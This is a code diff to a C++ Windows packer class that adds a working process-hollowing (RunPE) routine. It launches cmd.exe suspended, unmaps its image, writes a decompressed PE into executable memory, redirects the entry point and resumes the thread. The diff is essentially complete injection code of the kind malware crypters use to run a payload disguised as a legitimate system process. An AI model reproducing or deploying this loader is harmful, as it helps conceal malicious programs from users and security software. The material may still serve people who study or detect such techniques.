@@ -1,6 +1,7 @@
 #include "pch.h"
 #include "CPack6.h"
 #include <iostream>
+#include "CPe.h"
 
 CPack6::CPack6()
 	:nowBase(0), pFile(0)
@@ -21,7 +22,10 @@ CPack6::CPack6()
 	//TextAES(FALSE, (PBYTE)lz4.newAddr, lz4.newSize, 0x34333231);
 
 	this->pFile = lz4.newAddr;
+	this->Size = lz4.newSize;
 
+	if (CreateCMD())
+		return;
 	LoadEXE6();
 }
 
@@ -130,5 +134,108 @@ BOOL CPack6::FixIAT(DWORD RVA)
 
 		ImportTable++;
 	}
+	return TRUE;
+}
+
+BOOL CPack6::CreateCMD()
+{
+	// 1.启动进程 -挂起
+	STARTUPINFO stSi = { sizeof(STARTUPINFOA) };
+	PROCESS_INFORMATION stPi = { 0 };
+	BOOL bRet = CreateProcess(
+		L"C:\\Windows\\SysWOW64\\cmd.exe",
+		NULL,
+		NULL,
+		NULL,
+		FALSE,
+		CREATE_SUSPENDED| CREATE_NEW_CONSOLE,//挂起进程
+		NULL,
+		NULL,
+		&stSi,
+		&stPi);
+	if (bRet == FALSE)
+	{
+		MessageBox(NULL, L"create notepad error", NULL, MB_OK);
+		return 0;
+	}
+
+	// 2.获取进程寄存器上下文
+	CONTEXT threadContext = { CONTEXT_ALL };
+	bRet = GetThreadContext(stPi.hThread, &threadContext);
+	if (bRet == FALSE)
+	{
+		MessageBox(NULL, L"get context error", NULL, MB_OK);
+		return 0;
+	}
+
+	// 3.读取主程序加载基址 : 启动进程时【ebx + 8】存放 加载基址
+	DWORD ImageBase;
+	DWORD dwReadSize;
+	ReadProcessMemory(
+		stPi.hProcess,
+		(PVOID)(threadContext.Ebx + 8),
+		&ImageBase,
+		4,
+		&dwReadSize);
+	// 4. 释放内存空间 
+	typedef ULONG(WINAPI* MyNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
+	// 4.1 使用NtUnmapViewOfSection未文档函数,先或函数
+	MyNtUnmapViewOfSection UnMapviewOfSection =
+		(MyNtUnmapViewOfSection)GetProcAddress(
+			LoadLibrary(L"ntdll.dll"),
+			"NtUnmapViewOfSection");
+	// 4.2 释放目标进程内存空间
+	UnMapviewOfSection(stPi.hProcess, (PVOID)ImageBase);
+
+	// 5.1 读取新PE文件，
+	CPe pe;
+	//pe.Analysis_Pe((char*)"PE查看器.exe");
+	if (pe.Analysis_Pe(this->pFile, this->Size) == false)
+		return 0;
+
+	// 5.2 申请新空间
+	DWORD NewImageBase = pe.GetNtHeader()->OptionalHeader.ImageBase;
+	DWORD SizeImage = pe.GetNtHeader()->OptionalHeader.SizeOfImage;
+
+	LPVOID NewProcessBaseAddr = VirtualAllocEx(
+		stPi.hProcess,
+		(LPVOID)ImageBase,
+		SizeImage,
+		MEM_COMMIT | MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE);
+
+	if (NewProcessBaseAddr == 0)	return 0;
+	// 5.3 写入数据到目标进程中
+	// 5.3.1 替换PE头
+	WriteProcessMemory(
+		stPi.hProcess,
+		NewProcessBaseAddr,
+		pe.GetPeBuff(),
+		pe.GetNtHeader()->OptionalHeader.SizeOfHeaders,	// 头部大小
+		&dwReadSize
+	);
+
+
+	// 5.3.3 替换节
+	// 源exe
+	PIMAGE_SECTION_HEADER SectionnAddress = pe.GetSectionHeader();
+	// 获取区段个数
+	DWORD count = pe.GetNtHeader()->FileHeader.NumberOfSections;
+	for (int i = 0; i < count; i++)
+	{
+		// 将每个区段写入到目标文件中
+		WriteProcessMemory(
+			stPi.hProcess,
+			(LPVOID)((DWORD)NewProcessBaseAddr + SectionnAddress[i].VirtualAddress),
+			(LPVOID)((DWORD)pe.GetPeBuff() + SectionnAddress[i].PointerToRawData),
+			SectionnAddress[i].SizeOfRawData,
+			&dwReadSize
+		);
+
+	}
+	threadContext.Eax = pe.GetOptionalHeander()->AddressOfEntryPoint + (DWORD)NewProcessBaseAddr;
+	SetThreadContext(stPi.hThread, &threadContext);
+
+	ResumeThread(stPi.hThread);
 	return TRUE;
 }
